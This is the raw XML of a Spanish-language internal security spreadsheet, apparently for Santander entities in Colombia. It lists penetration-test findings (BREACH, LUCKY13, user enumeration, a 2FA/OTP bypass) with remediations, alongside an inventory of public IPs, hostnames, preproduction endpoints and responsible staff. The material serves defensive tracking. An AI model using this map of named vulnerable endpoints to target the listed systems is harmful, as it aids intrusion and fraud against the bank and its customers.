Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que 
el navegador del usuario interprete código JavaScript debido a una inyección de código, una 
posibilidad sería renderizar caracteres especiales como HTML Entities.</t>
  </si>
  <si>
    <t xml:space="preserve">SCO-25-CNMPA-016-CO-001 </t>
  </si>
  <si>
    <t>https://experiencia.santanderconsumer.co/
credito-vehiculo-relacional-90-dias</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>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como se deshabilita la compresión HTTP para Apache y NGINX: 
Deshabilitar compresión en Apache: 
●Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
 $ sudo a2dismod deflate 
●Reinicie el servidor: 
 $ sudo /etc/init.d/apache2 restart 
Deshabilitar compresión en NGINX: 
●Establezca la configuración del host con la opción gzip en off: 
 server { 
 server_name www.example.com; 
 listen 443 ssl http2; 
 gzip off; 
 }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>SCO-25-CNMPA-016-CO-002</t>
  </si>
  <si>
    <t>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(Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. 
CVEs Asociados: 
•CVE-2013-0169</t>
  </si>
  <si>
    <t>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</si>
  <si>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t>
  </si>
  <si>
    <t>MAN-690a34b3da6d35412ab62f1a</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-015-AP-001</t>
  </si>
  <si>
    <t>El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un  atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el  propio atacante. Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando  al aplicativo a solicitar un recurso en el dominio controlado por el atacante.</t>
  </si>
  <si>
    <t>Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para 
que no se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el 
servidor afectado para que utilice un servidor DNS interno o de la DMZ.</t>
  </si>
  <si>
    <t>Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que 
inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De 
esta manera, un atacante podría obtener más información sobre el equipo remoto, por 
ejemplo, la dirección IP de este. 
Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado 
como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración 
de datos vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta 
y se mostraría la dirección IP del servidor afectado como originaria del ataque.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-015-AP-002</t>
  </si>
  <si>
    <t xml:space="preserve">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Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor  revelan información interna acerca del tipo de servidor y versión de este, así como información  de la infraestructura interna de la aplicación</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, 
permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las 
mismas, así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-015-AP-003</t>
  </si>
  <si>
    <t>La cabecera "CSP" (Content Security Policy) permite al navegador del usuario controlar los  recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página.</t>
  </si>
  <si>
    <t>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"Content-Security_x0002_Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero 
se trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
•Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por 
ejemplo: 
•&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child_x0002_src 'none';"&gt; 
Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" 
se recomienda visitar los siguientes enlaces: 
•https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP 
•https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice 
una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>SCO-25-CNMPA-015-AP-004</t>
  </si>
  <si>
    <t xml:space="preserve">Fuga de información de aplicación y versión </t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework  de programación utilizada para sustentar a la propia aplicación, así como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Durante las pruebas realizadas se ha comprobado que las páginas por defecto revelan 
información interna acerca del software/framework y versión de este, utilizado para 
desarrollar la aplicación a través de la dirección URL 
“/lib/bootstrap/dist/js/bootstrap.bundle.min.js” y “/lib/jquery_x0002_validation/dist/jquery.validate.min.js”.
</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al 
software/framework y versión utilizada para desarrollar la propia aplicación. Para ello es 
necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error 
que divulguen este tipo de información.</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo 
permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las 
mismas, así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>SCO-25-CNMPA-015-AP-005</t>
  </si>
  <si>
    <t>Revelación de información a través de SSL/TLS 
(BREACH)</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de  tipo "gzip" o "DEFLATE"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t>
  </si>
  <si>
    <t>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cómo se deshabilita la compresión HTTP para Apache y NGINX: 
Deshabilitar compresión en Apache: 
●Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
 $ sudo a2dismod deflate 
●Reinicie el servidor: 
 $ sudo /etc/init.d/apache2 restart 
Deshabilitar compresión en NGINX: 
●Establezca la configuración del host con la opción gzip en off: 
 server { 
 server_name www.example.com; 
 listen 443 ssl http2; 
 gzip off; 
 }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-69089b91da6d35412ab5c11c</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-001</t>
  </si>
  <si>
    <t>https://simplefinance.santanderfinancing.co
m:4443/SimpleFinance/account/v1/account/
Public_Santander_Production/account</t>
  </si>
  <si>
    <t>El aplicativo o servicio permite conocer la existencia de nombres de usuario en el sistema. Este 
comportamiento se puede producir de dos maneras distintas: 
•El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario 
es un usuario válido en el sistema o aplicación afectada. 
•El aplicativo o servicio permite recuperar o acceder al listado de los usuarios dados de alta de 
manera total o parcial</t>
  </si>
  <si>
    <t>MAN-69089c85da6d35412ab5c11e</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-002</t>
  </si>
  <si>
    <t>https://simplefinance.santanderfinancing.co
m:4443/SimpleFinance</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-69089bd2da6d35412ab5c11d</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-003</t>
  </si>
  <si>
    <t>Evasión del proceso de firma con clave de operaciones o segundo factor de autenticación</t>
  </si>
  <si>
    <t>https://simplefinance.santanderfinancing.co
m:4443/SimpleFinance/otp/v1/otp/validate</t>
  </si>
  <si>
    <t>El uso de una clave de operaciones, o un segundo factor de autenticación, permite proteger ciertas operativas consideradas privilegiadas o críticas de un uso malintencionado por parte de un atacante que estuviera suplantando la identidad de un usuario legítimo de la aplicación. De esta manera, para realizar operaciones privilegiadas sería necesario conocer la clave de operaciones o el segundo factor de autenticación. La vulnerabilidad radica en que un atacante puede evadir el proceso de comprobación de la misma y realizar operaciones privilegiadas sin necesidad de conocer esta clave o 2FA.</t>
  </si>
  <si>
    <t>Como recomendación principal se debería sustituir el uso de una clave de operaciones por el uso 
de un token tipo 2FA de un sólo uso. 
En caso de no ser posible, a modo de medida compensatoria, se ha de verificar en el lado del servidor 
que el usuario ha introducido la clave de operaciones o segundo factor de autenticación de manera 
satisfactoria antes de proceder a realizar la operación privilegiada. 
En caso que el usuario no introduzca la clave de operaciones, segundo factor de autenticación, o que 
los haya introducido de manera errónea, se deberá generar un error y aumentar el contador de 
intentos fallidos. Además, se recomienda bloquear la clave de operaciones cuando el contador de 
intentos fallidos exceda de unos 3 intentos en un determinado espacio de tiempo.</t>
  </si>
  <si>
    <t>En caso de que el atacante consiga obtener acceso a la sesión de un usuario legítimo de la plataforma 
(por ejemplo mediante el robo de un identificador de sesión, usurpación de claves, uso de un equipo 
compartido) un atacante puede evadir el proceso de firma de la operación y realizar operaciones 
privilegiadas sin conocer la clave de operaciones o segundo factor de autenticación.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-004</t>
  </si>
  <si>
    <t>El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante. Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante.</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-005</t>
  </si>
  <si>
    <t>COMENDACIÓN
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como se deshabilita la compresión HTTP para Apache y NGINX: 
Deshabilitar compresión en Apache: 
●Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
 $ sudo a2dismod deflate 
●Reinicie el servidor: 
 $ sudo /etc/init.d/apache2 restart 
Deshabilitar compresión en NGINX: 
●Establezca la configuración del host con la opción gzip en off: 
 server { 
 server_name www.example.com; 
 listen 443 ssl http2; 
 gzip off; 
 }</t>
  </si>
  <si>
    <t>SCO-25-CNMPO-014-AP-006</t>
  </si>
  <si>
    <t>Revelación de información a través de SSL/TLS (LUCKY13 CVE_x0002_2013-0169)</t>
  </si>
  <si>
    <t>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(Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. 
CVEs Asociados: 
•CVE-2013-0169</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Santanderconsumer</t>
  </si>
  <si>
    <t>Potentially insecure policy; Ineffective headers</t>
  </si>
  <si>
    <t>Potentially insecure policy; Ineffective headers: Content-Security-Policy; Missing required headers</t>
  </si>
  <si>
    <t>(Potentially insecure policy) This Content-Security-Policy (CSP) has issues that possibly makes it insecure. - Remove any instances of "unsafe-" directives and "blob, data, filesystem" sources. Ensure your CSP directives are correctly configured. Learn more at W3C CSP.| (Ineffective headers: Content-Security-Policy) The implementation of these header(s) do not follow security best practices. - Ensure your headers are implemented correctly, as outlined in RFC-7231. Your headers should not permit caching of encrypted content. They should also have specific permissions (as opposed to using wildcards or other generalizations) and be formatted properly.| (Missing required headers) One or more required security headers are not set. - Ensure your policy correctly implements the required headers. Refer to the list of required headers.</t>
  </si>
  <si>
    <t>(An insecure CSP configuration was detected.) The Content Security Policy is not effective at meeting the security objectives defined for preventing Cross Site Scripting attacks, such as:
Preventing loading of unauthorized content resources and scripts.
Preventing clickjacking and other nested frame attacks.
Ensuring that web forms and links are behaving as intended.
 - To improve your configuration, make sure to:
Implement directives that set valid and complete source restrictions for loading dynamic content ('script-src', 'object-src', 'default-src').
Avoid the use of unsafe directives such as ‘unsafe-eval’ and ‘unsafe-inline’.
Avoid typos or otherwise invalid CSP directives.
Avoid wildcards, host-based allowlists, or bare URL schemes such as ‘HTTP’ in source directives.
Use specific sources, such as "https://www.example.com". Remove generalizations, such as "http:", "https:", "https://*.com".See Content Security Policy Configurations for more information.</t>
  </si>
  <si>
    <t>Cross domain subresource integrity check</t>
  </si>
  <si>
    <t>Missing integrity attribute</t>
  </si>
  <si>
    <t>(Missing integrity attribute) The page does not include an integrity attribute on cross-domain fetching of scripts. - Avoid loading scripts from third-party resources to prevent exposure to content and JavaScript manipulation by third parties or in case of a network compromise. If third-party script loading is unavoidable, subresource integrity tags should be used whenever possible.See Cross-Domain Subresource Integrity Check for more information.</t>
  </si>
  <si>
    <t>(Resource blocked by Content Security Policy (CSP)) The page attempted to load a resource that was blocked by the CSP policy. The presence of such error suggests that:_x000D_
_x000D_
The website content and security policies are incongruent._x000D_
The website unknowingly includes third-party content._x000D_
Malicious code is injected into the website but blocked by the CSP._x000D_
 - Review the website for CSP violation messages. Detailed information about the existing violations is available in the evidence details section and you may be able to find them on your browser of choice, on developer tools, under the Console tab. See Content Security Policy Violations for more information.</t>
  </si>
  <si>
    <t>Potentially insecure policy; Ineffective header</t>
  </si>
  <si>
    <t>(Public key size is less than 2048 bits) Keys shorter than 2048 bits may be insecure. - Use OpenSSL or SSL implementation of your choice to generate a new keypair, and specify 2048 bits or greater of key strength at generation. Implement the stronger keypair into your DKIM configuration.</t>
  </si>
  <si>
    <t>IP PUBLICA</t>
  </si>
  <si>
    <t>URL</t>
  </si>
  <si>
    <t>DESCRIPCIÓN</t>
  </si>
  <si>
    <t>Tipo</t>
  </si>
  <si>
    <t>Compañía</t>
  </si>
  <si>
    <t>Emitido Por</t>
  </si>
  <si>
    <t>Organización</t>
  </si>
  <si>
    <t>Vencimiento</t>
  </si>
  <si>
    <t>Ubicación</t>
  </si>
  <si>
    <t>Ambiente</t>
  </si>
  <si>
    <t>Estado</t>
  </si>
  <si>
    <t>Auteticado</t>
  </si>
  <si>
    <t>Critica</t>
  </si>
  <si>
    <t>Usuario Cyber</t>
  </si>
  <si>
    <t>Relación de IFA</t>
  </si>
  <si>
    <t>Gestor</t>
  </si>
  <si>
    <t>https://confirming.santander.com.co</t>
  </si>
  <si>
    <t>Website</t>
  </si>
  <si>
    <t>Inactivo</t>
  </si>
  <si>
    <t>170.169.139.29</t>
  </si>
  <si>
    <t>Portal Web de BSNC</t>
  </si>
  <si>
    <t>Entrust Certification Authority - L1K</t>
  </si>
  <si>
    <t>Entrust, Inc.</t>
  </si>
  <si>
    <t>lunes, 11 de agosto de 2025, 2:25:41</t>
  </si>
  <si>
    <t>SDS México</t>
  </si>
  <si>
    <t>Producción</t>
  </si>
  <si>
    <t>Activo</t>
  </si>
  <si>
    <t>No</t>
  </si>
  <si>
    <t>https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2f</t>
  </si>
  <si>
    <t>Si</t>
  </si>
  <si>
    <t>45.60.38.180, 170.169.139.30</t>
  </si>
  <si>
    <t>API</t>
  </si>
  <si>
    <t>GlobalSign Atlas R3 DV TLS CA 2025 Q1</t>
  </si>
  <si>
    <t>GlobalSign nv-sa</t>
  </si>
  <si>
    <t>domingo, 31 de agosto de 2025, 16:23:43</t>
  </si>
  <si>
    <t>Martha Sanchez</t>
  </si>
  <si>
    <t>181.48.106.208</t>
  </si>
  <si>
    <t>Internet principal Santander</t>
  </si>
  <si>
    <t>Local</t>
  </si>
  <si>
    <t>Internet Backup Santander</t>
  </si>
  <si>
    <t>Internet invitados principal Santander</t>
  </si>
  <si>
    <t>Internet invitados Backup Santander</t>
  </si>
  <si>
    <t>190.85.213.99</t>
  </si>
  <si>
    <t xml:space="preserve">https://soporte.premiercredit.co </t>
  </si>
  <si>
    <t>SCF</t>
  </si>
  <si>
    <t>190.85.213.101</t>
  </si>
  <si>
    <t>https://bpm.premiercredit.co:8000 / https://siif.premiercredit.co/siif/premier.asp</t>
  </si>
  <si>
    <t>SI</t>
  </si>
  <si>
    <t>https://tucarro.santanderconsumer.co:12443</t>
  </si>
  <si>
    <t>190.85.213.102</t>
  </si>
  <si>
    <t>seg.premiercredit.co</t>
  </si>
  <si>
    <t>Transferencia segura de ficheros</t>
  </si>
  <si>
    <t>180.26.147.22</t>
  </si>
  <si>
    <t>GAW</t>
  </si>
  <si>
    <t>miércoles, 16 de julio de 2025, 18:10:12</t>
  </si>
  <si>
    <t>https://tucarro.santanderconsumer.co/</t>
  </si>
  <si>
    <t xml:space="preserve">TuCarro </t>
  </si>
  <si>
    <t>https://clienteacces0.santanderconsumer.co/remote/login?lang=en</t>
  </si>
  <si>
    <t>Peer VPN</t>
  </si>
  <si>
    <t>170.169.139.30</t>
  </si>
  <si>
    <t>servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>Portal Consumo</t>
  </si>
  <si>
    <t>validacion.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>Api Consumo</t>
  </si>
  <si>
    <t>viabilizacion.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>ciudades.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>punto-fisico.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>Punto Fisico</t>
  </si>
  <si>
    <t>sso-management.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>191.232.52.127</t>
  </si>
  <si>
    <t>carroya.santanderconsumer.co</t>
  </si>
  <si>
    <t>CarroYa</t>
  </si>
  <si>
    <t>Portal Consumer</t>
  </si>
  <si>
    <t>Alejandra Rodriguez</t>
  </si>
  <si>
    <t>API Viabilizacion (Tucarro,Carroya)</t>
  </si>
  <si>
    <t>141.226.106.45, 94.188.208.248</t>
  </si>
  <si>
    <t>Portal de web de proveedores para la negociación para Confirming y Plan Mayor</t>
  </si>
  <si>
    <t>BOT</t>
  </si>
  <si>
    <t>181.53.71.214</t>
  </si>
  <si>
    <t>VPN Local TRIARA</t>
  </si>
  <si>
    <t>Sectigo RSA Organization Validation Secure Server CA</t>
  </si>
  <si>
    <t>Sectigo Limited</t>
  </si>
  <si>
    <t>miércoles, 10 de diciembre de 2025, 18:59:59</t>
  </si>
  <si>
    <t>Victor Aragon</t>
  </si>
  <si>
    <t>VPN Local NAOS</t>
  </si>
  <si>
    <t>Networking</t>
  </si>
  <si>
    <t>18.239.208.33</t>
  </si>
  <si>
    <t>Amazon RSA 2048 M03</t>
  </si>
  <si>
    <t>Amazon</t>
  </si>
  <si>
    <t>sábado, 21 de febrero de 2026, 18:59:59</t>
  </si>
  <si>
    <t>Olga Camargo</t>
  </si>
  <si>
    <t>13.227.219.84</t>
  </si>
  <si>
    <t>assets.stg.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Assets</t>
  </si>
  <si>
    <t>miércoles, 11 de febrero de 2026, 18:59:59</t>
  </si>
  <si>
    <t>ODS (AWS Irlanda West 2)</t>
  </si>
  <si>
    <t>Preproducción</t>
  </si>
  <si>
    <t>18.65.39.7</t>
  </si>
  <si>
    <t>api.cdt.santander.com.co</t>
  </si>
  <si>
    <t>GlobalSign Atlas R3 DV TLS CA 2024 Q4</t>
  </si>
  <si>
    <t>miércoles, 16 de abril de 2025, 11:13:02</t>
  </si>
  <si>
    <t>35.71.143.211</t>
  </si>
  <si>
    <t>even.cdt.santander.com.co</t>
  </si>
  <si>
    <t>08/02/2025 - 11/03/2026</t>
  </si>
  <si>
    <t>18.65.39.99</t>
  </si>
  <si>
    <t>teal.cdt.santander.com.co</t>
  </si>
  <si>
    <t>martes, 10 de marzo de 2026, 18:59:59</t>
  </si>
  <si>
    <t>65.9.95.80</t>
  </si>
  <si>
    <t>www.stg.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Amazon RSA 2048 M02</t>
  </si>
  <si>
    <t>18.239.83.120</t>
  </si>
  <si>
    <t>gdcs.prod.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>martes, 24 de marzo de 2026, 18:59:59</t>
  </si>
  <si>
    <t>108.156.60.90</t>
  </si>
  <si>
    <t>api.qa.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>lunes, 25 de agosto de 2025, 17:20:06</t>
  </si>
  <si>
    <t>108.156.60.64</t>
  </si>
  <si>
    <t>www.proda.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>api.dev.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>api.ocu.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>https://www.stg.mb.cdt.santander.com.co/stc/pse/views/home</t>
  </si>
  <si>
    <t>PSE Website</t>
  </si>
  <si>
    <t>sábado, 11 de enero de 2025, 19:00:00</t>
  </si>
  <si>
    <t>https://www.stg.mb.cdt.santander.com.co/stc/login</t>
  </si>
  <si>
    <t>Login</t>
  </si>
  <si>
    <t>https://www.stg.mb.cdt.santander.com.co/stc/onboarding/registration</t>
  </si>
  <si>
    <t>Onboarding</t>
  </si>
  <si>
    <t>18.65.39.78</t>
  </si>
  <si>
    <t>Servicio para reconocimiento para CDT</t>
  </si>
  <si>
    <t>65.9.95.81</t>
  </si>
  <si>
    <t>www.prodb.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>https://www.santander.com.co/Empresas/#/administrationGeneral/login</t>
  </si>
  <si>
    <t>Supernet V6</t>
  </si>
  <si>
    <t>Portal Web de Financing</t>
  </si>
  <si>
    <t>Go Daddy Secure Certificate Authority - G2</t>
  </si>
  <si>
    <t>GoDaddy.com, Inc.</t>
  </si>
  <si>
    <t>martes, 13 de mayo de 2025, 7:18:41</t>
  </si>
  <si>
    <t>Se dará de baja 15/04/2025</t>
  </si>
  <si>
    <t>Landing aliados</t>
  </si>
  <si>
    <t>App para generacion de Token para el ingreso de clientes a Supernet</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Playstore / Appstore</t>
  </si>
  <si>
    <t>Bizagi</t>
  </si>
  <si>
    <t>18.235.29.58 - 167.89.123.204</t>
  </si>
  <si>
    <t>Subdominio para envío de correos electronicos</t>
  </si>
  <si>
    <t>lunes, 2 de diciembre de 2024, 7:51:27</t>
  </si>
  <si>
    <t>181.57.221.231</t>
  </si>
  <si>
    <t>Garantia bancarias (Circular Conjunta 001 del 20 de agosto de 2021)</t>
  </si>
  <si>
    <t>https://consola.reconoserid.com</t>
  </si>
  <si>
    <t>Consola Admin</t>
  </si>
  <si>
    <t>sábado, 7 de junio de 2025, 9:37:11</t>
  </si>
  <si>
    <t>Terceros</t>
  </si>
  <si>
    <t>https://recidam.olimpiait.com/</t>
  </si>
  <si>
    <t>API ReconoSerID</t>
  </si>
  <si>
    <t>19/06/2024 - 21/07/2025</t>
  </si>
  <si>
    <t>https://recidaw.olimpiait.com/</t>
  </si>
  <si>
    <t>Api Fuentes Abiertas</t>
  </si>
  <si>
    <t>https://recidvw.olimpiait.com/</t>
  </si>
  <si>
    <t>Iframe ReconoSerID</t>
  </si>
  <si>
    <t>ca.s-am.goskope.com</t>
  </si>
  <si>
    <t>Banco Santander</t>
  </si>
  <si>
    <t>viernes, 6 de marzo de 2026, 18:44:54</t>
  </si>
  <si>
    <t>190.85.213.100</t>
  </si>
  <si>
    <t>Orquestador de microservicios</t>
  </si>
  <si>
    <t>lunes, 18 de agosto de 2025, 4:46:41</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Portal de prueba de ACH, no es de Banco </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>(No aplica EH)</t>
    </r>
  </si>
  <si>
    <t>DigiCert Global G2 TLS RSA SHA256 2020 CA1</t>
  </si>
  <si>
    <t>DigiCert Inc</t>
  </si>
  <si>
    <t>miércoles, 18 de junio de 2025, 18:59:59</t>
  </si>
  <si>
    <t>Jaime Vargas / Alejandra Rodriguez</t>
  </si>
  <si>
    <t>api.santander.com.co</t>
  </si>
  <si>
    <t>Danilo Leguizamon</t>
  </si>
  <si>
    <t>No esta en uso</t>
  </si>
  <si>
    <t>104.18.240.108, 104.18.241.108, 104.18.242.108, 104.18.243.108, 104.18.244.108</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">CRM Hubspot </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>(Validar fecha de ejecución del EH)</t>
    </r>
  </si>
  <si>
    <t>viernes, 6 de marzo de 2026, 18:46:20</t>
  </si>
  <si>
    <t>Proveedor</t>
  </si>
  <si>
    <t>mb-api-pse-co.stg.ok-cloud.net</t>
  </si>
  <si>
    <t>PSE API</t>
  </si>
  <si>
    <t>Proceso de viabilización</t>
  </si>
  <si>
    <t>martes, 4 de marzo de 2025, 16:23:43</t>
  </si>
  <si>
    <t>SFTP</t>
  </si>
  <si>
    <t>Cesar Garzón</t>
  </si>
  <si>
    <t>Aplicativo de viabilización de ejecutivos comerciales</t>
  </si>
  <si>
    <t>factoring.santander.com.co</t>
  </si>
  <si>
    <t>martes, 1 de julio de 2025, 6:07:38</t>
  </si>
  <si>
    <t>https://portalrecaudo-santandercolombia-uat.noprd.e-pagos.cl/</t>
  </si>
  <si>
    <t>Recaudo Electrónico y Físico - API Notificaciones</t>
  </si>
  <si>
    <t>viernes, 6 de marzo de 2026, 16:18:53</t>
  </si>
  <si>
    <t>Se debe revisar si lo el EH lo realiza el proveedor</t>
  </si>
  <si>
    <t>https://gestion-santandercolombia-uat.noprd.e-pagos.cl</t>
  </si>
  <si>
    <t>viernes, 6 de marzo de 2026, 16:16:35</t>
  </si>
  <si>
    <t>Ambiente Preproductivo Factoring</t>
  </si>
  <si>
    <t>viernes, 6 de marzo de 2026, 18:48:58</t>
  </si>
  <si>
    <t>http://64.76.90.138:9090/factoring/index.seam</t>
  </si>
  <si>
    <t>Ambiente Preproductivo Confirming y Plan Mayor</t>
  </si>
  <si>
    <t>WAF 107.154.251.109
BOT 64.76.89.146</t>
  </si>
  <si>
    <t>http://64.76.89.146:9090/factoring/index.seam</t>
  </si>
  <si>
    <t>Portal de web de proveedores para la negociación para Factoring</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Dominio para envio de NPS </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>(Pendiente salida con proyecto)</t>
    </r>
  </si>
  <si>
    <t>WE1</t>
  </si>
  <si>
    <t>Google Trust Services</t>
  </si>
  <si>
    <t>lunes, 12 de mayo de 2025, 13:04:22</t>
  </si>
  <si>
    <t>En desarrollo</t>
  </si>
  <si>
    <t>bo.prod.cc.cdt.santander.com.co</t>
  </si>
  <si>
    <t>BO para la gestión de Keys, Assets…</t>
  </si>
  <si>
    <t>WEB</t>
  </si>
  <si>
    <t>Sí, con SSO (Azure)</t>
  </si>
  <si>
    <t>Camargo Orjuela Olga Maria</t>
  </si>
  <si>
    <t>prod.cc.cdt.santander.com.co</t>
  </si>
  <si>
    <t>API gateway donde se ubican los servicios del BO</t>
  </si>
  <si>
    <t>proda.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>prodb.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>https://bancosantander.novacloud.com.co/Banco_Santander/</t>
  </si>
  <si>
    <t>Novasoft</t>
  </si>
  <si>
    <t>lynx.api.santander.com.co</t>
  </si>
  <si>
    <t>Lynx</t>
  </si>
  <si>
    <t>si</t>
  </si>
  <si>
    <t>no</t>
  </si>
  <si>
    <t>Orlando Nariño</t>
  </si>
  <si>
    <t>A</t>
  </si>
  <si>
    <t>Número identificador de la vulnerabilidad.</t>
  </si>
  <si>
    <t>B</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Compañía: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>BSNC (Banco Santander de Negocios Colombia)</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> SF (Santander Financing).</t>
    </r>
  </si>
  <si>
    <t>C</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Fuente que detecta la vulnerabilidad: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Task Force</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Qualys</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Deloitte</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Synack</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
